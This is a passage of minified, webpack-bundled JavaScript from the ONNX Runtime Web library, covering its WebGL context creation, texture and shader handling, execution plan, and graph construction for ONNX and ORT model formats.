getGlChannels(rank=6){return["x","y","z","w","u","v"].slice(0,rank)}},"./lib/onnxjs/backends/webgl/webgl-context-factory.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.createNewWebGLContext=exports.createWebGLContext=void 0;const instrument_1=__webpack_require__("./lib/onnxjs/instrument.ts"),webgl_context_1=__webpack_require__("./lib/onnxjs/backends/webgl/webgl-context.ts"),cache={};function createNewWebGLContext(canvas,contextId){let gl;const ca={alpha:!1,depth:!1,antialias:!1,stencil:!1,preserveDrawingBuffer:!1,premultipliedAlpha:!1,failIfMajorPerformanceCaveat:!1};if((!contextId||"webgl2"===contextId)&&(gl=canvas.getContext("webgl2",ca),gl))try{return new webgl_context_1.WebGLContext(gl,2)}catch(err){instrument_1.Logger.warning("GlContextFactory",`failed to create WebGLContext using contextId 'webgl2'. Error: ${err}`)}if((!contextId||"webgl"===contextId)&&(gl=canvas.getContext("webgl",ca)||canvas.getContext("experimental-webgl",ca),gl))try{return new webgl_context_1.WebGLContext(gl,1)}catch(err){instrument_1.Logger.warning("GlContextFactory",`failed to create WebGLContext using contextId 'webgl' or 'experimental-webgl'. Error: ${err}`)}throw new Error("WebGL is not supported")}exports.createWebGLContext=function createWebGLContext(contextId){let context;if(contextId&&"webgl2"!==contextId||!("webgl2"in cache)?contextId&&"webgl"!==contextId||!("webgl"in cache)||(context=cache.webgl):context=cache.webgl2,!context)try{context=createNewWebGLContext(function createOffscreenCanvas(){if("undefined"==typeof OffscreenCanvas)throw new TypeError("failed to create offscreen canvas: OffscreenCanvas is not supported");return new OffscreenCanvas(1,1)}(),contextId)}catch(e){context=createNewWebGLContext(function createCanvas(){if("undefined"==typeof document)throw new TypeError("failed to create canvas: document is not supported");const canvas=document.createElement("canvas");return canvas.width=1,canvas.height=1,canvas}(),contextId)}contextId=contextId||1===context.version?"webgl":"webgl2";const gl=context.gl;return cache[contextId]=context,gl.isContextLost()?(delete cache[contextId],createWebGLContext(contextId)):(gl.disable(gl.DEPTH_TEST),gl.disable(gl.STENCIL_TEST),gl.disable(gl.BLEND),gl.disable(gl.DITHER),gl.disable(gl.POLYGON_OFFSET_FILL),gl.disable(gl.SAMPLE_COVERAGE),gl.enable(gl.SCISSOR_TEST),gl.enable(gl.CULL_FACE),gl.cullFace(gl.BACK),context)},exports.createNewWebGLContext=createNewWebGLContext},"./lib/onnxjs/backends/webgl/webgl-context.ts":function(__unused_webpack_module,exports,__webpack_require__){"use strict";var __createBinding=this&&this.__createBinding||(Object.create?function(o,m,k,k2){void 0===k2&&(k2=k);var desc=Object.getOwnPropertyDescriptor(m,k);desc&&!("get"in desc?!m.__esModule:desc.writable||desc.configurable)||(desc={enumerable:!0,get:function(){return m[k]}}),Object.defineProperty(o,k2,desc)}:function(o,m,k,k2){void 0===k2&&(k2=k),o[k2]=m[k]}),__setModuleDefault=this&&this.__setModuleDefault||(Object.create?function(o,v){Object.defineProperty(o,"default",{enumerable:!0,value:v})}:function(o,v){o.default=v}),__importStar=this&&this.__importStar||function(mod){if(mod&&mod.__esModule)return mod;var result={};if(null!=mod)for(var k in mod)"default"!==k&&Object.prototype.hasOwnProperty.call(mod,k)&&__createBinding(result,mod,k);return __setModuleDefault(result,mod),result};Object.defineProperty(exports,"__esModule",{value:!0}),exports.WebGLContext=exports.linearSearchLastTrue=void 0;const onnxruntime_common_1=__webpack_require__("../common/dist/cjs/index.js"),DataEncoders=__importStar(__webpack_require__("./lib/onnxjs/backends/webgl/texture-data-encoder.ts")),utils_1=__webpack_require__("./lib/onnxjs/backends/webgl/utils.ts");function linearSearchLastTrue(arr){let i=0;for(;i<arr.length;++i){if(!arr[i]())break}return i-1}exports.linearSearchLastTrue=linearSearchLastTrue;exports.WebGLContext=class WebGLContext{constructor(gl,version){this.frameBufferBound=!1,this.itemsToPoll=[],this.gl=gl,this.version=version,this.getExtensions(),this.vertexbuffer=this.createVertexbuffer(),this.framebuffer=this.createFramebuffer(),this.queryVitalParameters()}allocateTexture(width,height,encoder,data){const gl=this.gl,texture=gl.createTexture();gl.bindTexture(gl.TEXTURE_2D,texture),gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_MIN_FILTER,gl.NEAREST),gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_MAG_FILTER,gl.NEAREST),gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_WRAP_S,gl.CLAMP_TO_EDGE),gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_WRAP_T,gl.CLAMP_TO_EDGE);const buffer=data?encoder.encode(data,width*height):null;return gl.texImage2D(gl.TEXTURE_2D,0,encoder.internalFormat,width,height,0,encoder.format,encoder.textureType,buffer),this.checkError(),texture}updateTexture(texture,width,height,encoder,data){const gl=this.gl;gl.bindTexture(gl.TEXTURE_2D,texture);const buffer=encoder.encode(data,width*height);gl.texSubImage2D(gl.TEXTURE_2D,0,0,0,width,height,encoder.format,encoder.textureType,buffer),this.checkError()}attachFramebuffer(texture,width,height){const gl=this.gl;gl.bindTexture(gl.TEXTURE_2D,texture),gl.bindFramebuffer(gl.FRAMEBUFFER,this.framebuffer),gl.framebufferTexture2D(gl.FRAMEBUFFER,gl.COLOR_ATTACHMENT0,gl.TEXTURE_2D,texture,0),this.checkError(),gl.viewport(0,0,width,height),gl.scissor(0,0,width,height)}readTexture(texture,width,height,dataSize,dataType,channels){const gl=this.gl;channels||(channels=1),this.frameBufferBound||this.attachFramebuffer(texture,width,height);const encoder=this.getEncoder(dataType,channels),buffer=encoder.allocate(width*height);return gl.bindTexture(gl.TEXTURE_2D,texture),gl.framebufferTexture2D(gl.FRAMEBUFFER,gl.COLOR_ATTACHMENT0,gl.TEXTURE_2D,texture,0),gl.readPixels(0,0,width,height,gl.RGBA,encoder.textureType,buffer),this.checkError(),encoder.decode(buffer,dataSize)}isFramebufferReady(){return!0}getActiveTexture(){const gl=this.gl;return"TEXTURE"+(gl.getParameter(this.gl.ACTIVE_TEXTURE)-gl.TEXTURE0)}getTextureBinding(){return this.gl.getParameter(this.gl.TEXTURE_BINDING_2D)}getFramebufferBinding(){return this.gl.getParameter(this.gl.FRAMEBUFFER_BINDING)}setVertexAttributes(positionHandle,textureCoordHandle){const gl=this.gl;gl.vertexAttribPointer(positionHandle,3,gl.FLOAT,!1,20,0),gl.enableVertexAttribArray(positionHandle),-1!==textureCoordHandle&&(gl.vertexAttribPointer(textureCoordHandle,2,gl.FLOAT,!1,20,12),gl.enableVertexAttribArray(textureCoordHandle)),this.checkError()}createProgram(vertexShader,fragShader){const gl=this.gl,program=gl.createProgram();return gl.attachShader(program,vertexShader),gl.attachShader(program,fragShader),gl.linkProgram(program),program}compileShader(shaderSource,shaderType){const gl=this.gl,shader=gl.createShader(shaderType);if(!shader)throw new Error(`createShader() returned null with type ${shaderType}`);if(gl.shaderSource(shader,shaderSource),gl.compileShader(shader),!1===gl.getShaderParameter(shader,gl.COMPILE_STATUS))throw new Error(`Failed to compile shader: ${gl.getShaderInfoLog(shader)}\nShader source:\n${shaderSource}`);return shader}deleteShader(shader){this.gl.deleteShader(shader)}bindTextureToUniform(texture,position,uniformHandle){const gl=this.gl;gl.activeTexture(gl.TEXTURE0+position),this.checkError(),gl.bindTexture(gl.TEXTURE_2D,texture),this.checkError(),gl.uniform1i(uniformHandle,position),this.checkError()}draw(){this.gl.drawArrays(this.gl.TRIANGLE_STRIP,0,4),this.checkError()}checkError(){if(onnxruntime_common_1.env.debug){const gl=this.gl,error=gl.getError();let label="";switch(error){case gl.NO_ERROR:return;case gl.INVALID_ENUM:label="INVALID_ENUM";break;case gl.INVALID_VALUE:label="INVALID_VALUE";break;case gl.INVALID_OPERATION:label="INVALID_OPERATION";break;case gl.INVALID_FRAMEBUFFER_OPERATION:label="INVALID_FRAMEBUFFER_OPERATION";break;case gl.OUT_OF_MEMORY:label="OUT_OF_MEMORY";break;case gl.CONTEXT_LOST_WEBGL:label="CONTEXT_LOST_WEBGL";break;default:label=`Unknown WebGL Error: ${error.toString(16)}`}throw new Error(label)}}deleteTexture(texture){this.gl.deleteTexture(texture)}deleteProgram(program){this.gl.deleteProgram(program)}getEncoder(dataType,channels,usage=0){if(2===this.version)return new DataEncoders.RedFloat32DataEncoder(this.gl,channels);switch(dataType){case"float":return 1===usage||this.isRenderFloat32Supported?new DataEncoders.RGBAFloatDataEncoder(this.gl,channels):new DataEncoders.RGBAFloatDataEncoder(this.gl,channels,this.textureHalfFloatExtension.HALF_FLOAT_OES);case"int":throw new Error("not implemented");case"byte":return new DataEncoders.Uint8DataEncoder(this.gl,channels);default:throw new Error(`Invalid dataType: ${dataType}`)}}clearActiveTextures(){const gl=this.gl;for(let unit=0;unit<this.maxTextureImageUnits;++unit)gl.activeTexture(gl.TEXTURE0+unit),gl.bindTexture(gl.TEXTURE_2D,null)}dispose(){if(this.disposed)return;const gl=this.gl;gl.bindFramebuffer(gl.FRAMEBUFFER,null),gl.deleteFramebuffer(this.framebuffer),gl.bindBuffer(gl.ARRAY_BUFFER,null),gl.deleteBuffer(this.vertexbuffer),gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER,null),gl.finish(),this.disposed=!0}createDefaultGeometry(){return new Float32Array([-1,1,0,0,1,-1,-1,0,0,0,1,1,0,1,1,1,-1,0,1,0])}createVertexbuffer(){const gl=this.gl,buffer=gl.createBuffer();if(!buffer)throw new Error("createBuffer() returned null");const geometry=this.createDefaultGeometry();return gl.bindBuffer(gl.ARRAY_BUFFER,buffer),gl.bufferData(gl.ARRAY_BUFFER,geometry,gl.STATIC_DRAW),this.checkError(),buffer}createFramebuffer(){const fb=this.gl.createFramebuffer();if(!fb)throw new Error("createFramebuffer returned null");return fb}queryVitalParameters(){const gl=this.gl;if(this.isFloatTextureAttachableToFrameBuffer=this.checkFloatTextureAttachableToFrameBuffer(),this.isRenderFloat32Supported=this.checkRenderFloat32(),this.isFloat32DownloadSupported=this.checkFloat32Download(),1===this.version&&!this.textureHalfFloatExtension&&!this.isRenderFloat32Supported)throw new Error("both float32 and float16 TextureType are not supported");this.isBlendSupported=!this.isRenderFloat32Supported||this.checkFloat32Blend(),this.maxTextureSize=gl.getParameter(gl.MAX_TEXTURE_SIZE),this.maxTextureImageUnits=gl.getParameter(gl.MAX_TEXTURE_IMAGE_UNITS),this.version}getExtensions(){2===this.version?(this.colorBufferFloatExtension=this.gl.getExtension("EXT_color_buffer_float"),this.disjointTimerQueryWebgl2Extension=this.gl.getExtension("EXT_disjoint_timer_query_webgl2")):(this.textureFloatExtension=this.gl.getExtension("OES_texture_float"),this.textureHalfFloatExtension=this.gl.getExtension("OES_texture_half_float"))}checkFloatTextureAttachableToFrameBuffer(){const gl=this.gl,texture=gl.createTexture();gl.bindTexture(gl.TEXTURE_2D,texture);const internalFormat=2===this.version?gl.RGBA32F:gl.RGBA;gl.texImage2D(gl.TEXTURE_2D,0,internalFormat,1,1,0,gl.RGBA,gl.FLOAT,null);const frameBuffer=gl.createFramebuffer();gl.bindFramebuffer(gl.FRAMEBUFFER,frameBuffer),gl.framebufferTexture2D(gl.FRAMEBUFFER,gl.COLOR_ATTACHMENT0,gl.TEXTURE_2D,texture,0);const isComplete=gl.checkFramebufferStatus(gl.FRAMEBUFFER)===gl.FRAMEBUFFER_COMPLETE;return gl.bindTexture(gl.TEXTURE_2D,null),gl.bindFramebuffer(gl.FRAMEBUFFER,null),gl.deleteTexture(texture),gl.deleteFramebuffer(frameBuffer),isComplete}checkRenderFloat32(){if(2===this.version){if(!this.colorBufferFloatExtension)return!1}else if(!this.textureFloatExtension)return!1;return this.isFloatTextureAttachableToFrameBuffer}checkFloat32Download(){if(2===this.version){if(!this.colorBufferFloatExtension)return!1}else{if(!this.textureFloatExtension)return!1;if(!this.gl.getExtension("WEBGL_color_buffer_float"))return!1}return this.isFloatTextureAttachableToFrameBuffer}checkFloat32Blend(){const gl=this.gl;let texture,frameBuffer,vertexShader,fragmentShader,program;try{texture=gl.createTexture(),frameBuffer=gl.createFramebuffer(),gl.bindTexture(gl.TEXTURE_2D,texture);const internalFormat=2===this.version?gl.RGBA32F:gl.RGBA;return gl.texImage2D(gl.TEXTURE_2D,0,internalFormat,1,1,0,gl.RGBA,gl.FLOAT,null),gl.bindFramebuffer(gl.FRAMEBUFFER,frameBuffer),gl.framebufferTexture2D(gl.FRAMEBUFFER,gl.COLOR_ATTACHMENT0,gl.TEXTURE_2D,texture,0),gl.enable(gl.BLEND),vertexShader=gl.createShader(gl.VERTEX_SHADER),vertexShader?(gl.shaderSource(vertexShader,"void main(){}"),gl.compileShader(vertexShader),fragmentShader=gl.createShader(gl.FRAGMENT_SHADER),!!fragmentShader&&(gl.shaderSource(fragmentShader,"precision highp float;void main(){gl_FragColor=vec4(0.5);}"),gl.compileShader(fragmentShader),program=gl.createProgram(),!!program&&(gl.attachShader(program,vertexShader),gl.attachShader(program,fragmentShader),gl.linkProgram(program),gl.useProgram(program),gl.drawArrays(gl.POINTS,0,1),gl.getError()===gl.NO_ERROR))):!1}finally{gl.disable(gl.BLEND),program&&gl.deleteProgram(program),vertexShader&&gl.deleteShader(vertexShader),fragmentShader&&gl.deleteShader(fragmentShader),frameBuffer&&(gl.bindFramebuffer(gl.FRAMEBUFFER,null),gl.deleteFramebuffer(frameBuffer)),texture&&(gl.bindTexture(gl.TEXTURE_2D,null),gl.deleteTexture(texture))}}beginTimer(){if(2===this.version&&this.disjointTimerQueryWebgl2Extension){const gl2=this.gl,ext=this.disjointTimerQueryWebgl2Extension,query=gl2.createQuery();return gl2.beginQuery(ext.TIME_ELAPSED_EXT,query),query}throw new Error("WebGL1 profiling currently not supported.")}endTimer(){if(2!==this.version||!this.disjointTimerQueryWebgl2Extension)throw new Error("WebGL1 profiling currently not supported");{const gl2=this.gl,ext=this.disjointTimerQueryWebgl2Extension;gl2.endQuery(ext.TIME_ELAPSED_EXT)}}isTimerResultAvailable(query){let available=!1,disjoint=!1;if(2!==this.version||!this.disjointTimerQueryWebgl2Extension)throw new Error("WebGL1 profiling currently not supported");{const gl2=this.gl,ext=this.disjointTimerQueryWebgl2Extension;available=gl2.getQueryParameter(query,gl2.QUERY_RESULT_AVAILABLE),disjoint=gl2.getParameter(ext.GPU_DISJOINT_EXT)}return available&&!disjoint}getTimerResult(query){let timeElapsed=0;if(2!==this.version)throw new Error("WebGL1 profiling currently not supported");{const gl2=this.gl;timeElapsed=gl2.getQueryParameter(query,gl2.QUERY_RESULT),gl2.deleteQuery(query)}return timeElapsed/1e6}async waitForQueryAndGetTime(query){return await(0,utils_1.repeatedTry)((()=>this.isTimerResultAvailable(query))),this.getTimerResult(query)}async createAndWaitForFence(){const fenceContext=this.createFence(this.gl);return this.pollFence(fenceContext)}createFence(gl){let isFencePassed;const gl2=gl,query=gl2.fenceSync(gl2.SYNC_GPU_COMMANDS_COMPLETE,0);return gl.flush(),isFencePassed=null===query?()=>!0:()=>{const status=gl2.clientWaitSync(query,0,0);return status===gl2.ALREADY_SIGNALED||status===gl2.CONDITION_SATISFIED},{query:query,isFencePassed:isFencePassed}}async pollFence(fenceContext){return new Promise((resolve=>{this.addItemToPoll((()=>fenceContext.isFencePassed()),(()=>resolve()))}))}pollItems(){const index=linearSearchLastTrue(this.itemsToPoll.map((x=>x.isDoneFn)));for(let i=0;i<=index;++i){const{resolveFn:resolveFn}=this.itemsToPoll[i];resolveFn()}this.itemsToPoll=this.itemsToPoll.slice(index+1)}async addItemToPoll(isDoneFn,resolveFn){this.itemsToPoll.push({isDoneFn:isDoneFn,resolveFn:resolveFn}),this.itemsToPoll.length>1||await(0,utils_1.repeatedTry)((()=>(this.pollItems(),0===this.itemsToPoll.length)))}}},"./lib/onnxjs/execution-plan.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.ExecutionPlan=void 0;const instrument_1=__webpack_require__("./lib/onnxjs/instrument.ts");class KernelOp{constructor(op,node){this.op=op,this.node=node}}exports.ExecutionPlan=class ExecutionPlan{constructor(graph,ops,profiler){this.graph=graph,this.profiler=profiler,this.initialize(ops)}initialize(ops){this.profiler.event("session","ExecutionPlan.initialize",(()=>{const graphNodes=this.graph.getNodes();if(graphNodes.length!==ops.length)throw new Error("The size of nodes and OPs do not match.");this._ops=ops.map(((op,i)=>new KernelOp(op,graphNodes[i]))),this.reset(),this._starter=[],this._ops.forEach(((op,i)=>{let resolved=!0;for(const input of op.node.inputs)if(!this._values[input]&&-1===this.graph.getInputIndices().indexOf(input)){resolved=!1;break}resolved&&this._starter.push(i)}))}))}reset(){this._values=this.graph.getValues().map((i=>i.tensor))}async execute(sessionHandler,modelInputs){return this.profiler.event("session","ExecutionPlan.execute",(async()=>{this.reset();const inferenceHandler=sessionHandler.createInferenceHandler(),graphInputs=this.graph.getInputIndices();if(modelInputs.length!==graphInputs.length)throw new Error(`number of input tensors don't match the number of inputs to the model: actual: ${modelInputs.length} expected: ${graphInputs.length}`);modelInputs.forEach(((input,i)=>{const index=graphInputs[i];this._values[index]=input}));const sequence=this._starter.slice(0),graphValues=this.graph.getValues(),graphNodes=this.graph.getNodes();let rear=0;for(;rear<sequence.length;){const thisOpIndex=sequence[rear++],thisOp=this._ops[thisOpIndex],inputList=thisOp.node.inputs.map((i=>this._values[i]));if(-1!==inputList.indexOf(void 0))throw new Error(`unresolved input detected: op: ${thisOp.node}`);const inputTensors=inputList;instrument_1.Logger.verbose("ExecPlan",`Runing op:${thisOp.node.name} (${inputTensors.map(((t,i)=>`'${thisOp.node.inputs[i]}': ${t.type}[${t.dims.join(",")}]`)).join(", ")})`);const outputList=await this.profiler.event("node",thisOp.node.name,(async()=>thisOp.op.impl(inferenceHandler,inputTensors,thisOp.op.context)));if(outputList.length!==thisOp.node.outputs.length)throw new Error("the size of output does not match model definition.");outputList.forEach(((output,i)=>{const j=thisOp.node.outputs[i];if(this._values[j])throw new Error(`output [${j}] already has value: op:${thisOp.node.name}`);this._values[j]=output}));const downstreamNodes=new Set;outputList.forEach(((output,i)=>{const j=thisOp.node.outputs[i];for(const currentDownstreamNodeIndex of graphValues[j].to){const currentDownstreamNode=graphNodes[currentDownstreamNodeIndex];let resolved=!0;for(const k of currentDownstreamNode.inputs)if(!this._values[k]){resolved=!1;break}resolved&&downstreamNodes.add(currentDownstreamNodeIndex)}})),sequence.push(...downstreamNodes)}const output=[];for(let i=0;i<this.graph.getOutputIndices().length;i++){const outputIndex=this.graph.getOutputIndices()[i],outputTensor=this._values[outputIndex];if(void 0===outputTensor)throw new Error(`required output [${outputIndex}] does not have value`);0===outputIndex?await outputTensor.getData():outputTensor.data,output.push(outputTensor)}return instrument_1.Logger.verbose("ExecPlan","disposing of inferenceHandler"),inferenceHandler.dispose(),output}))}}},"./lib/onnxjs/graph.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.Graph=void 0;const attribute_1=__webpack_require__("./lib/onnxjs/attribute.ts"),ort_generated_1=__webpack_require__("./lib/onnxjs/ort-schema/flatbuffers/ort-generated.ts"),onnx_1=__webpack_require__("./lib/onnxjs/ort-schema/protobuf/onnx.js"),tensor_1=__webpack_require__("./lib/onnxjs/tensor.ts"),util_1=__webpack_require__("./lib/onnxjs/util.ts");var ortFbs=ort_generated_1.onnxruntime.experimental.fbs;exports.Graph={from:(graphProto,initializer)=>new GraphImpl(graphProto,initializer)};class Value{constructor(valueInfo){this._from=void 0,this._to=[],this.tensor=void 0,this.type=void 0,valueInfo&&(this.type=util_1.ProtoUtil.tensorValueTypeFromProto(valueInfo.type.tensorType))}get from(){return this._from}get to(){return this._to}}class Node{constructor(_nodeProto,name){_nodeProto instanceof onnx_1.onnx.NodeProto?(this.name=_nodeProto.name,this.opType=_nodeProto.opType,this.attributes=new attribute_1.Attribute(_nodeProto.attribute)):_nodeProto instanceof ortFbs.Node&&(this.name=null!=name?name:_nodeProto.name(),this.opType=_nodeProto.opType(),this.attributes=new attribute_1.Attribute(util_1.ProtoUtil.tensorAttributesFromORTFormat(_nodeProto))),this.inputs=[],this.outputs=[],this.executeNode=!0}}class GraphImpl{constructor(graph,graphInitializer){if(!graph)throw new TypeError("graph is empty");this.buildGraph(graph),this.transformGraph(graphInitializer),this.checkIsAcyclic()}getInputIndices(){return this._allInputIndices}getInputNames(){return this._allInputNames}getOutputIndices(){return this._allOutputIndices}getOutputNames(){return this._allOutputNames}getValues(){return this._allData}getNodes(){return this._nodes}buildGraph(graph){if(graph instanceof onnx_1.onnx.GraphProto)this.buildGraphFromOnnxFormat(graph);else{if(!(graph instanceof ortFbs.Graph))throw new TypeError("Graph type is not supported.");this.buildGraphFromOrtFormat(graph)}}buildGraphFromOnnxFormat(graph){const dataIndices=new Map;this._allData=[],this._allInputIndices=[],this._allInputNames=[],this._allOutputIndices=[],this._allOutputNames=[],this._nodes=[];const nodesIndices=new Map;if(!graph.input)throw new Error("missing information in graph: input");const inputValueNames=[];for(const i of graph.input){if(dataIndices.has(i.name))throw new Error(`duplicated input name: ${i.name}`);const currentIndex=this._allData.push(new Value(i))-1;dataIndices.set(i.name,currentIndex),inputValueNames.push(i.name)}if(!graph.initializer)throw new Error("missing information in graph: initializer");for(const i of graph.initializer){let index=dataIndices.get(i.name);if(void 0===index){const value=new Value;value.type={shape:{dims:util_1.ProtoUtil.tensorDimsFromProto(i.dims)},tensorType:util_1.ProtoUtil.tensorDataTypeFromProto(i.dataType)},index=this._allData.push(value)-1,dataIndices.set(i.name,index)}this._allData[index]._from=-1,this._allData[index].tensor=tensor_1.Tensor.fromProto(i)}for(let i=0;i<this._allData.length;i++)this._allData[i].tensor||(this._allInputIndices.push(i),this._allInputNames.push(inputValueNames[i]));if(!graph.output)throw new Error("missing information in graph: output");for(const i of graph.output){if(dataIndices.has(i.name))throw new Error(`duplicated output name: ${i.name}`);const currentIndex=this._allData.push(new Value(i))-1;dataIndices.set(i.name,currentIndex),this._allOutputIndices.push(currentIndex),this._allOutputNames.push(i.name)}if(!graph.node)throw new Error("missing information in graph: node");for(const nodeProto of graph.node){if(!nodeProto.name)for(let pick=0;;pick++){const name=`unnamed_${nodeProto.opType}_${pick}`;if(!nodesIndices.has(name)){nodeProto.name=name;break}}if(nodesIndices.has(nodeProto.name))throw new Error(`duplicated node name: ${nodeProto.name}`);const currentIndex=this._nodes.push(new Node(nodeProto))-1;nodesIndices.set(nodeProto.name,currentIndex)}for(let i=0;i<this._nodes.length;i++){const node=this._nodes[i],nodeProto=graph.node[i];if(!nodeProto.output)throw new Error(`missing output for node: ${nodeProto.name}`);for(const output of nodeProto.output){let dataIndex=dataIndices.get(output);if(void 0===dataIndex&&(dataIndex=this._allData.push(new Value)-1,dataIndices.set(output,dataIndex)),node.outputs.push(dataIndex),void 0!==this._allData[dataIndex]._from)throw new Error(`multiple nodes output to one data value: ${dataIndex}`);if(this._allData[dataIndex]._from=i,"Constant"===nodeProto.opType){if(!nodeProto.attribute||1!==nodeProto.attribute.length||!nodeProto.attribute[0].t)throw new Error("missing attributes or missing tensor value in attributes for this Constant operator");if(!nodeProto.output||1!==nodeProto.output.length)throw new Error("missing output or incorrect number of outputs for this Constant operator");node.outputs.pop(),node.executeNode=!1,this._allData[dataIndex]._from=-1,this._allData[dataIndex].tensor=tensor_1.Tensor.fromProto(nodeProto.attribute[0].t)}}}for(let i=0;i<this._nodes.length;i++){const node=this._nodes[i],nodeProto=graph.node[i];if(!nodeProto.input)throw new Error(`missing input for node: ${nodeProto.name}`);for(const input of nodeProto.input){const dataIndex=dataIndices.get(input);if(void 0===dataIndex){if(""===input&&(3===nodeProto.input.length||4===nodeProto.input.length)&&"Resize"===nodeProto.opType)continue;throw new Error(`unrecognized input '${input}' for node: ${nodeProto.name}`)}node.inputs.push(dataIndex),this._allData[dataIndex]._to.push(i)}}return!0}buildGraphFromOrtFormat(graph){var _a,_b,_c;const dataIndices=new Map;this._allData=[],this._allInputIndices=[],this._allInputNames=[],this._allOutputIndices=[],this._allOutputNames=[],this._nodes=[];const nodesIndices=new Map,inputValueNames=[];for(let i=0;i<graph.inputsLength();i++){const inputName=graph.inputs(i);if(dataIndices.has(inputName))throw new Error(`duplicated input name: ${inputName}`);for(let j=0;j<graph.nodeArgsLength();j++)if((null===(_a=graph.nodeArgs(j))||void 0===_a?void 0:_a.name())===inputName){const value=new Value;if((null===(_c=null===(_b=graph.nodeArgs(j))||void 0===_b?void 0:_b.type())||void 0===_c?void 0:_c.valueType())!==ortFbs.TypeInfoValue.tensor_type)throw new Error("Unexpected value type for the nodeArg.");const valueInfo=graph.nodeArgs(j).type().value(new ortFbs.TensorTypeAndShape),type=util_1.ProtoUtil.tensorDataTypeFromProto(valueInfo.elemType()),shape=valueInfo.shape(),dims=[];for(let k=0;k<shape.dimLength();k++)dims.push(util_1.LongUtil.longToNumber(shape.dim(k).value().dimValue()));value.type={shape:{dims:dims},tensorType:type};const currentIndex=this._allData.push(value)-1;dataIndices.set(inputName,currentIndex),inputValueNames.push(inputName)}}for(let i=0;i<graph.initializersLength();i++){const initializer=graph.initializers(i);let index=dataIndices.get(initializer.name());if(void 0===index){const value=new Value,dims=util_1.ProtoUtil.tensorDimsFromORTFormat(initializer),type=util_1.ProtoUtil.tensorDataTypeFromProto(initializer.dataType());value.type={shape:{dims:dims},tensorType:type},index=this._allData.push(value)-1,dataIndices.set(initializer.name(),index)}this._allData[index]._from=-1,this._allData[index].tensor=tensor_1.Tensor.fromOrtTensor(initializer)}for(let i=0;i<this._allData.length;i++)this._allData[i].tensor||(this._allInputIndices.push(i),this._allInputNames.push(inputValueNames[i]));for(let i=0;i<graph.outputsLength();i++){const outputName=graph.outputs(i);if(dataIndices.has(outputName))throw new Error(`duplicated output name: ${outputName}`);const currentIndex=this._allData.push(new Value)-1;dataIndices.set(outputName,currentIndex),this._allOutputIndices.push(currentIndex),this._allOutputNames.push(outputName)}if(!graph.nodes)throw new Error("missing information in graph: node");for(let i=0;i<graph.nodesLength();i++){const nodeProto=graph.nodes(i);let name=nodeProto.name();if(!name)for(let pick=0;name=`unnamed_${nodeProto.opType()}_${pick}`,nodesIndices.has(name);pick++);if(nodesIndices.has(name))throw new Error(`duplicated node name: ${name}`);const currentIndex=this._nodes.push(new Node(nodeProto,name))-1;nodesIndices.set(name,currentIndex)}for(let i=0;i<this._nodes.length;i++){const node=this._nodes[i],nodeProto=graph.nodes(i);if(null==nodeProto)throw new Error(`No node exists at index ${i}`);if(0===(null==nodeProto?void 0:nodeProto.outputsLength()))throw new Error(`missing output for node: ${nodeProto.name}`);for(let j=0;j<(null==nodeProto?void 0:nodeProto.outputsLength());j++){const output=null==nodeProto?void 0:nodeProto.outputs(j);let dataIndex=dataIndices.get(output);if(void 0===dataIndex&&(dataIndex=this._allData.push(new Value)-1,dataIndices.set(output,dataIndex)),node.outputs.push(dataIndex),void 0!==this._allData[dataIndex]._from)throw new Error(`multiple nodes output to one data value: ${dataIndex}`);if(this._allData[dataIndex]._from=i,"Constant"===nodeProto.opType()){if(1!==nodeProto.attributesLength()||!nodeProto.attributes(0).t())throw new Error("missing attributes or missing tensor value in attributes for this Constant operator");if(1!==nodeProto.outputsLength())throw new Error("missing output or incorrect number of outputs for this Constant operator");node.outputs.pop(),node.executeNode=!1,this._allData[dataIndex]._from=-1,this._allData[dataIndex].tensor=tensor_1.Tensor.fromOrtTensor(nodeProto.attributes(0).t())}}}for(let i=0;i<this._nodes.length;i++){const node=this._nodes[i],nodeProto=graph.nodes(i);if(0===nodeProto.inputsLength())throw new Error(`missing input for node: ${nodeProto.name}`);for(let j=0;j<nodeProto.inputsLength();j++){const input=nodeProto.inputs(j),dataIndex=dataIndices.get(input);if(void 0===dataIndex)throw new Error(`unrecognized input '${input}' for node: ${nodeProto.name()}`);node.inputs.push(dataIndex),this._allData[dataIndex]._to.push(i)}}}checkIsAcyclic(){const starters=new Set;this._allInputIndices.forEach((i=>{this._allData[i]._to.forEach((j=>{starters.add(j)}))}));const nodesStack=Array.from(starters),nodesState=new Array(this._nodes.length).fill("white");for(;nodesStack.length>0;){const nodeIndex=nodesStack.pop();"gray"===nodesState[nodeIndex]?nodesState[nodeIndex]="black":(nodesStack.push(nodeIndex),nodesState[nodeIndex]="gray",this._nodes[nodeIndex].outputs.forEach((outgoingEdgeIndex=>{const data=this._allData[outgoingEdgeIndex];if(void 0!==data.tensor)throw new Error("node outputs should not be initialized");if(data._from!==nodeIndex)throw new Error("from property of the Value object doesn't match index of Node being processed");data._to.forEach((downstreamNodeIndex=>{if("gray"===nodesState[downstreamNodeIndex])throw new Error("model graph is cyclic");"white"===nodesState[downstreamNodeIndex]&&nodesStack.push(downstreamNodeIndex)}))})))}}transformGraph(graphInitializer){this.removeAllIdentityNodes(),this.removeAllDropoutNodes(),this.fuseConvActivationNodes(),graphInitializer&&graphInitializer.transformGraph(this),this.finalizeGraph()}finalizeGraph(){let offset=0;const newIndices=new Array(this._nodes.length,0);let nodePossition=0;for(let i=0;i<this._nodes.length;i++)newIndices[i]=nodePossition,this._nodes[i].executeNode?(nodePossition!==i&&(this._nodes[nodePossition]=this._nodes[i]),nodePossition++):this._nodes[i].outputs.forEach((ind=>{this._allData[ind]._from=-2}));this._nodes.splice(nodePossition,this._nodes.length-nodePossition);for(let i=0;i<this._allData.length;i++){const currentData=this._allData[i];void 0!==currentData._from&&-1!==currentData._from&&-2!==currentData._from&&(currentData._from=newIndices[currentData._from]);for(let j=0;j<currentData._to.length;j++){if(!(currentData._to[j]>=0))throw new Error("Trying to update a removed node");currentData._to[j]=newIndices[currentData._to[j]]}}offset=0;for(let 